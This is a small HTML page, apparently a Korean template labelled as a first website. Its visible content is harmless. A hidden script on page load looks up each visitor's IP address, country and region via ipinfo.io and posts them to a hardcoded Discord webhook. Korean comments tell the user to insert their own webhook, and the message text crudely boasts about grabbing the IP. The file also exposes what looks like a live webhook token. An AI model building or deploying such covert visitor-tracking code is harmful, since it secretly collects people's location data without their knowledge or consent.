<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>test site</title>
    <script>
        // 1. 본인의 디스코드 웹훅 URL을 입력해 주세요. (끝에 /github가 없어야 합니다)
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554079546448285738/bPvvBD1kInPi0nVVwC1y9rMM1RUo3aApOciZMQyGjx1Sa0Aids9GLlCPfJ9B_nRpGx3-";

        window.onload = async function() {
            try {
                // CORS 에러가 없는 다른 안정적인 IP 조회 API 사용
                const response = await fetch('https://ipinfo.io');
                const data = await response.json();
                
                const clientIp = data.ip;
                const region = data.region || "알 수 없음"; // 접속 지역 (예: Seoul)
                const country = data.country || "알 수 없음"; // 국가 (예: KR)

                // 디스코드로 보낼 메시지 구성
                const payload = {
                    content: `**# 아이피땄다시발**\n- **IP 주소:** \`\${clientIp}\`\n- **위치:** ${country} (${region})\n- **접속 시간:** ${new Date().toLocaleString()}`
                };

                // 디스코드 웹훅 전송
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

            } catch (error) {
                console.error('오류 발생:', error);
            }
        };
    </script>
</head>
<body>
    <h1>첨으로 웹사이트 만듬ㅋ</h1>
</body>
</html>
